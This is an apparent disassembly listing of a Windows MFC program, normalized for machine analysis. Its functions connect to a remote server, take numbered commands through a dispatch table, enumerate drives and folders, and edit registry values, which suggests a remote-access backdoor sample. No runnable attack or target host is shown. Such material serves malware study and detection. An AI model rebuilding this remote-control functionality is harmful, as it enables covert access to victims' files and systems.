mov [ esi + 0xc ] 0xea61
call Ordinal_MFC42_6139
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
pop edi
mov eax [ eax + 0xcc ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] eax
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4032d0
push 0xffffffff
push sub_40dbfb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x20 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_610
lea ecx [ esi + 0x8 ]
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403330
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
pop esi
retn
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov [ esi + 0x10 ] eax
sub_403350
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call [ closesocket@IAT ]
mov ecx esi
call sub_403330
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
call [ edx + 0x54 ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
call [ edx + 0x14 ]
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov [ esi + 0x1c ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
pop esi
retn
mov edx [ ecx ]
call [ edx + 0x14 ]
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ esi + 0x14 ] 0x0
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_4033e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40dc28
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebp
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
push 0x1
lea eax [ esp + 0x13 ]
push 0x1
push eax
push ecx
mov [ esp + 0x1f ] 0x0
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi + 0xc ]
lea edx [ esp + 0x14 ]
push eax
push edx
call sub_402f50
lea ebp [ esi + 0x8 ]
push eax
mov ecx ebp
mov [ esp + 0x3c ] 0x0
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_800
mov eax [ ebp ]
mov edi rw-data
mov ecx [ esp + 0x30 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx esi
call sub_403350
cmp eax 0x2745
je r-xdata
push ebp
mov ecx rw-data
call Ordinal_MFC42_858
mov ecx esi
call sub_403350
push 0x4
mov ecx esi
mov [ esp + 0x1c ] 0x0
call sub_4071d0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp eax 0x274c
jne r-xdata
lea eax [ esp + 0x18 ]
push 0x4
push eax
mov ecx esi
call sub_407300
test eax eax
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_800
lea eax [ esp + 0x10 ]
mov ecx rw-data
push eax
call Ordinal_MFC42_858
mov cx [ ebp ]
mov [ esp + 0x20 ] 0x2
push ecx
call [ htons@IAT ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x22 ] ax
push edx
call [ inet_addr@IAT ]
mov ebp [ connect@IAT ]
mov [ esp + 0x24 ] eax
xor edi edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
push ebx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_540
mov ecx [ esi + 0x4 ]
lea ebp [ esi + 0xc ]
lea edx [ esp + 0x20 ]
push ebp
push edx
mov [ esp + 0x44 ] 0x1
call sub_402f50
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x40 ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x20 ]
mov [ esp + 0x3c ] 0x1
call Ordinal_MFC42_800
mov eax [ esp + 0x14 ]
mov edi rw-data
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
call Ordinal_MFC42_1175
test eax eax
je r-xdata
cmp edi 0x3
jl r-xdata
test eax eax
pop ebx
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x20 ]
push 0x10
push eax
push ecx
inc edi
call ebp
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x20 ]
mov ecx [ esi + 0x10 ]
push 0x21
push 0x465
push eax
push ecx
call [ WSAAsyncSelect@IAT ]
mov ecx esi
call sub_4073b0
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push 0x4
push ecx
mov ecx esi
call sub_407470
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx esi
push edx
call sub_403690
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
sub_403690
mov eax [ esp + 0x4 ]
push esi
test eax eax
mov esi ecx
jne r-xdata
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2 ]
cmp eax 0x24
ja r-xdata
mov ecx [ esi + 0x10 ]
push 0x0
lea eax [ esp + 0xc ]
push 0x4
push eax
push ecx
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn 0x4
jmp [ eax * 4 + jump_table_4037e4 ]
mov ecx esi
call sub_404140
pop esi
retn 0x4
mov ecx esi
call sub_4041d0
pop esi
retn 0x4
mov ecx esi
call sub_404450
pop esi
retn 0x4
mov ecx esi
call sub_404730
pop esi
retn 0x4
mov ecx esi
call sub_404f20
pop esi
retn 0x4
mov ecx esi
call sub_4050f0
pop esi
retn 0x4
mov ecx esi
call sub_405190
pop esi
retn 0x4
mov ecx esi
call sub_405220
pop esi
retn 0x4
mov ecx esi
call sub_4052e0
pop esi
retn 0x4
mov ecx esi
call sub_4053b0
pop esi
retn 0x4
mov ecx esi
call sub_4056f0
pop esi
retn 0x4
mov ecx esi
call sub_4058b0
pop esi
retn 0x4
mov ecx esi
call sub_405e10
pop esi
retn 0x4
mov ecx esi
call sub_405fe0
pop esi
retn 0x4
mov ecx esi
call sub_4061a0
pop esi
retn 0x4
mov ecx esi
call sub_4065f0
pop esi
retn 0x4
mov ecx esi
call sub_406680
pop esi
retn 0x4
mov ecx esi
call sub_4067c0
pop esi
retn 0x4
mov ecx esi
call sub_406850
pop esi
retn 0x4
mov ecx esi
call sub_406ab0
pop esi
retn 0x4
mov ecx esi
call sub_406d30
pop esi
retn 0x4
mov ecx esi
call sub_406e80
pop esi
retn 0x4
mov ecx esi
call sub_406f40
pop esi
retn 0x4
mov ecx esi
call sub_406f00
pop esi
retn 0x4
mov ecx esi
call sub_404d60
sub_403880
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40dc48
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov ebx [ esp + 0x24 ]
mov [ esp + 0x14 ] 0x0
test ebx ebx
jne r-xdata
push ebx
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_2915
mov edi [ esp + 0x1c ]
mov ecx ebx
mov edx ecx
mov esi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x14 ] 0xffffffff
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_800
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0xc
mov eax [ esp + 0x20 ]
mov ebx [ eax - 0x8 ]
sub_403900
push 0xffffffff
push sub_40dc87
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov [ esp + 0x8 ] 0x0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x1
call Ordinal_MFC42_540
mov esi [ esp + 0x20 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x64
push 0x64
lea ecx [ esp + 0x20 ]
mov [ esp + 0x30 ] 0x2
call Ordinal_MFC42_2919
push eax
push esi
call [ GetVolumeInformationA@IAT ]
push 0xffffffff
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_5572
mov esi [ esp + 0x1c ]
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x8 ] 0x1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_4039b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40dca8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
push edi
mov edx [ esp + 0x28 ]
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push edx
call [ GetDiskFreeSpaceExA@IAT ]
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x8 ]
mov edi [ esp + 0xc ]
jmp r-xdata
lea ecx [ esp + 0x28 ]
mov [ esp + 0x20 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x8
sub_403a30
push 0xffffffff
push sub_40dce0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push ebp
push esi
push edi
mov [ esp + 0x14 ] ecx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x0
call Ordinal_MFC42_356
lea eax [ esp + 0x48 ]
push rw-data
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x4c ] 0x1
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x48 ] 0x2
call Ordinal_MFC42_2770
lea ecx [ esp + 0x10 ]
mov esi eax
mov [ esp + 0x40 ] 0x1
call Ordinal_MFC42_800
test esi esi
je r-xdata
lea ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x0
call Ordinal_MFC42_668
lea ecx [ esp + 0x48 ]
mov [ esp + 0x40 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x38 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x34
retn 0xc
mov ebx [ esp + 0x50 ]
lea ecx [ esp + 0x50 ]
mov [ esp + 0x40 ] 0x1
call Ordinal_MFC42_800
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push 0x10
lea ecx [ esp + 0x20 ]
call [ eax + 0x40 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_2781
lea edx [ esp + 0x50 ]
lea ecx [ esp + 0x1c ]
push edx
mov [ esp + 0x1c ] eax
call Ordinal_MFC42_3181
lea ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x3
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
mov edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] edi
[ edi ]
mov edi [ esp + 0x4c ]
mov ebp [ ebx + 0x8 ]
not ecx
dec ecx
push 0xffffffff
mov esi ecx
mov ecx ebx
sub esi edi
lea eax [ esi + ebp + 0x1 ]
push eax
call Ordinal_MFC42_6139
mov edx [ esp + 0x10 ]
lea ecx [ esi + 0x1 ]
mov eax ecx
lea esi [ edx + edi ]
mov edi [ ebx + 0x4 ]
add edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x4c ]
push ebx
push ecx
push ecx
lea edx [ esp + 0x5c ]
mov ecx esp
mov [ esp + 0x1c ] esp
push edx
call Ordinal_MFC42_535
mov ecx [ esp + 0x20 ]
call sub_403a30
jmp r-xdata
sub_403ba0
push 0xffffffff
push sub_40dd08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
mov ecx [ eax - 0x8 ]
mov al [ ecx + eax - 0x1 ]
cmp al 0x5c
je r-xdata
push esi
lea eax [ esp + 0x1c ]
push edi
push eax
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_535
mov edi [ CreateDirectoryA@IAT ]
mov [ esp + 0x18 ] 0x1
push rw-data
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_941
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x18 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x4
lea ecx [ esi + 0x1 ]
lea edx [ esp + 0xc ]
push ecx
push 0x0
push edx
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_4278
mov eax [ esp + 0xc ]
push 0x0
push eax
mov [ esp + 0x20 ] 0x2
call edi
push 0x7c
push esi
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5856
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_800
jmp r-xdata
push rw-data
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_2764
mov esi eax
cmp esi 0xffffffff
je r-xdata
sub_403c80
push 0xffffffff
push sub_40dd40
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push ebp
push esi
push edi
mov ebx ecx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] 0x0
call Ordinal_MFC42_356
lea eax [ esp + 0x40 ]
push rw-data
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x44 ] 0x1
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] 0x2
call Ordinal_MFC42_2770
lea ecx [ esp + 0x10 ]
mov esi eax
mov [ esp + 0x38 ] 0x1
call Ordinal_MFC42_800
test esi esi
je r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] 0x0
call Ordinal_MFC42_668
lea ecx [ esp + 0x40 ]
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x30 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2c
retn 0x10
mov edi [ esp + 0x4c ]
mov esi [ esp + 0x48 ]
mov ebp [ esp + 0x44 ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x38 ] 0x1
call Ordinal_MFC42_800
mov eax [ esp + 0x48 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x10
lea ecx [ esp + 0x18 ]
call [ eax + 0x40 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2781
lea edx [ esp + 0x4c ]
lea ecx [ esp + 0x14 ]
push edx
mov [ esp + 0x4c ] eax
call Ordinal_MFC42_3181
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] 0x3
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
mov edx [ ebp ]
lea ecx [ esp + 0x14 ]
inc edx
mov [ ebp ] edx
call Ordinal_MFC42_3319
add [ edi ] eax
mov ecx [ esi ]
push edi
inc ecx
push esi
push ebp
push ecx
mov [ esi ] ecx
mov ecx esp
mov [ esp + 0x54 ] esp
lea edx [ esp + 0x5c ]
push rw-data
push edx
push ecx
call Ordinal_MFC42_924
mov ecx ebx
call sub_403c80
jmp r-xdata
sub_403dd0
push 0xffffffff
push sub_40dd58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
lea ecx [ esp + 0x14 ]
lea edx [ esp ]
xor eax eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
push eax
push 0x20007
push eax
push eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] eax
push eax
mov eax [ esp + 0x34 ]
push eax
push ecx
call [ RegCreateKeyExA@IAT ]
mov edx [ esp + 0x1c ]
mov eax [ esp ]
push edx
push eax
call [ RegDeleteValueA@IAT ]
mov ecx [ esp ]
push ecx
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xc ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0xc
sub_403e60
push 0xffffffff
push sub_40ddb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
push ebx
push ebp
push esi
push edi
mov esi ecx
mov edi [ esp + 0x68 ]
mov [ esp + 0x58 ] 0x1
test edi edi
je r-xdata
lea ecx [ esp + 0x34 ]
call Ordinal_MFC42_356
lea edx [ esp + 0x64 ]
lea eax [ esp + 0x60 ]
push edx
lea ecx [ esp + 0x6c ]
push eax
push ecx
mov [ esp + 0x64 ] 0x7
call Ordinal_MFC42_922
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x60 ] 0x8
call Ordinal_MFC42_2770
lea ecx [ esp + 0x68 ]
mov esi eax
mov [ esp + 0x58 ] 0x7
call Ordinal_MFC42_800
test esi esi
je r-xdata
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_356
lea eax [ esp + 0x60 ]
push rw-data
lea ecx [ esp + 0x6c ]
mov bl 0x2
push eax
push ecx
mov [ esp + 0x64 ] bl
call Ordinal_MFC42_924
mov eax [ eax ]
push 0x0
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x60 ] 0x3
call Ordinal_MFC42_2770
lea ecx [ esp + 0x68 ]
mov ebp eax
mov [ esp + 0x58 ] bl
call Ordinal_MFC42_800
test ebp ebp
je r-xdata
lea ecx [ esp + 0x34 ]
call Ordinal_MFC42_1980
lea ecx [ esp + 0x34 ]
mov [ esp + 0x58 ] 0x1
call Ordinal_MFC42_668
lea ecx [ esp + 0x60 ]
mov [ esp + 0x58 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x64 ]
mov [ esp + 0x58 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x50 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x4c
retn 0x10
lea ecx [ esp + 0x34 ]
call Ordinal_MFC42_2781
lea ecx [ esp + 0x34 ]
mov [ esp + 0x14 ] eax
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_1980
lea ecx [ esp + 0x18 ]
mov [ esp + 0x58 ] 0x1
call Ordinal_MFC42_668
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_2781
mov edx [ esp + 0x18 ]
push 0x10
lea ecx [ esp + 0x1c ]
mov ebp eax
call [ edx + 0x40 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
lea edx [ esp + 0x68 ]
lea ecx [ esp + 0x34 ]
push edx
call Ordinal_MFC42_3181
mov eax [ esp + 0x34 ]
push 0x10
lea ecx [ esp + 0x38 ]
mov [ esp + 0x5c ] 0x9
call [ eax + 0x40 ]
mov ecx [ esp + 0x68 ]
mov edi [ esp + 0x6c ]
push 0xffffffff
mov [ esp + 0x14 ] eax
mov ebp [ ecx - 0x8 ]
mov ebx [ edi + 0x8 ]
mov ecx edi
lea edx [ ebx + ebp + 0x2 ]
push edx
call Ordinal_MFC42_6139
mov edi [ edi + 0x4 ]
mov esi [ esp + 0x68 ]
lea ecx [ ebp + 0x1 ]
add edi ebx
mov eax ecx
mov [ esp + 0x58 ] 0x7
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x6c ]
mov edx [ ecx + 0x4 ]
lea ecx [ esp + 0x68 ]
add edx ebx
mov [ edx + ebp + 0x1 ] al
call Ordinal_MFC42_800
test ebp ebp
jne r-xdata
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4058
test eax eax
jne r-xdata
mov eax [ esp + 0x6c ]
lea edx [ esp + 0x64 ]
push eax
push edi
push ecx
mov ecx esp
mov [ esp + 0x20 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x74 ]
lea ecx [ esp + 0x24 ]
push eax
mov [ esp + 0x68 ] 0x4
call Ordinal_MFC42_3181
push ecx
mov [ esp + 0x68 ] 0x5
mov ecx esp
mov [ esp + 0x20 ] esp
push rw-data
push eax
push ecx
call Ordinal_MFC42_924
mov ecx esi
mov [ esp + 0x68 ] 0x6
call sub_403e60
lea ecx [ esp + 0x68 ]
mov [ esp + 0x58 ] bl
call Ordinal_MFC42_800
sub_4040c0
push 0xffffffff
push sub_40dde0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push esi
lea ecx [ esp + 0x4 ]
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_356
mov eax [ esp + 0x30 ]
push 0x0
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x30 ] 0x1
call Ordinal_MFC42_2770
lea ecx [ esp + 0x4 ]
mov esi eax
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_668
lea ecx [ esp + 0x30 ]
mov [ esp + 0x28 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x20 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x4
sub_404140
sub esp 0x24
push esi
mov esi ecx
push edi
mov ecx 0x7
xor eax eax
lea edi [ esp + 0xc ]
[ edi ]
push 0x0
push ecx
mov ecx esp
mov [ esp + 0x10 ] esp
push rw-data
stosb [ edi ]
call Ordinal_MFC42_537
lea eax [ esp + 0x14 ]
mov ecx esi
push eax
call sub_403880
mov edx [ esi + 0x4 ]
push 0x0
push ecx
add edx 0x4
mov ecx esp
mov [ esp + 0x10 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x22 ]
mov ecx esi
push eax
call sub_403880
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
lea edx [ esp + 0xc ]
push 0x1d
push edx
push 0x0
push eax
mov ecx esi
call sub_4070f0
push 0x1d
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x24
retn
sub_4041d0
push 0xffffffff
push sub_40de1c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x27c
push ebx
push ebp
mov ebp ecx
push esi
push edi
push 0xffffffff
lea ebx [ ebp + 0x20 ]
push 0x0
mov ecx ebx
call Ordinal_MFC42_6139
mov eax 0x41
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x294 ] 0xffffffff
call Ordinal_MFC42_800
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x5b
mov [ esp + 0x14 ] eax
jl r-xdata
jmp [ eax * 4 + jump_table_40443c ]
push 0x1
push eax
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_536
push rw-data
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x29c ] 0x0
push eax
call Ordinal_MFC42_924
lea ecx [ esp + 0x24 ]
mov [ esp + 0x294 ] 0x2
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
push ecx
call [ GetDriveTypeA@IAT ]
mov edx eax
lea eax [ edx - 0x2 ]
cmp eax 0x3
ja r-xdata
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov esi [ ebp + 0x28 ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x28 ]
[ edi ]
mov [ esp + 0x28 ] edx
lea edx [ esi + 0x104 ]
push 0xffffffff
push edx
mov ecx ebx
call Ordinal_MFC42_6139
mov edi [ ebp + 0x24 ]
mov ecx 0x41
add edi esi
lea esi [ esp + 0x28 ]
[ edi ] [ esi ]
jmp r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x28 ]
[ edi ]
push ecx
lea eax [ esp + 0x14 ]
mov ecx esp
mov [ esp + 0x20 ] esp
push eax
mov [ esp + 0x30 ] edx
call Ordinal_MFC42_535
lea ecx [ esp + 0x1c ]
push ecx
mov ecx ebp
call sub_403900
push 0x0
push ecx
lea edx [ esp + 0x20 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
mov [ esp + 0x2a0 ] 0x3
call Ordinal_MFC42_535
lea eax [ esp + 0x34 ]
mov ecx ebp
push eax
call sub_403880
mov esi [ ebp + 0x28 ]
push 0xffffffff
lea ecx [ esi + 0x104 ]
push ecx
mov ecx ebx
call Ordinal_MFC42_6139
mov edi [ ebp + 0x24 ]
mov ecx 0x41
add edi esi
lea esi [ esp + 0x28 ]
[ edi ] [ esi ]
mov [ esp + 0x294 ] 0x2
lea ecx [ esp + 0x18 ]
jmp r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x28 ]
push 0x301
[ edi ]
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x130 ]
push 0x160
push eax
push 0x0
push ecx
mov [ esp + 0x3c ] edx
call [ SHGetFileInfoA@IAT ]
mov edx [ esp + 0x12c ]
push edx
call [ DestroyIcon@IAT ]
lea eax [ esp + 0x138 ]
lea ecx [ esp + 0x20 ]
push eax
call Ordinal_MFC42_537
push 0x0
push ecx
lea edx [ esp + 0x28 ]
mov ecx esp
mov [ esp + 0x24 ] esp
push edx
mov [ esp + 0x2a0 ] 0x4
call Ordinal_MFC42_535
lea eax [ esp + 0x34 ]
mov ecx ebp
push eax
call sub_403880
mov esi [ ebp + 0x28 ]
push 0xffffffff
lea ecx [ esi + 0x104 ]
push ecx
mov ecx ebx
call Ordinal_MFC42_6139
mov edi [ ebp + 0x24 ]
mov ecx 0x41
add edi esi
lea esi [ esp + 0x28 ]
[ edi ] [ esi ]
mov [ esp + 0x294 ] 0x2
lea ecx [ esp + 0x20 ]
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x10 ]
push eax
push ecx
push 0x1
push edx
mov ecx ebp
call sub_4070f0
mov eax [ ebp + 0x28 ]
mov ecx ebp
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
call Ordinal_MFC42_800
mov ecx [ esp + 0x28c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x288
retn
sub_404450
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40de68
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push ebp
mov ebp ecx
mov eax [ ebp + 0x10 ]
push eax
call sub_406ff0
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ esp + 0x5c ]
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x60
retn
push 0xffffffff
lea ecx [ ebp + 0x20 ]
push ebx
call Ordinal_MFC42_6139
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
push ebx
push eax
push ecx
mov ecx ebp
call sub_407060
test eax eax
je r-xdata
push esi
push edi
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_540
mov esi [ ebp + 0x24 ]
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x70 ] 0x0
call Ordinal_MFC42_2919
mov ecx ebx
mov edi eax
mov edx ecx
push 0xffffffff
shr ecx 0x2
[ edi ] [ esi ]
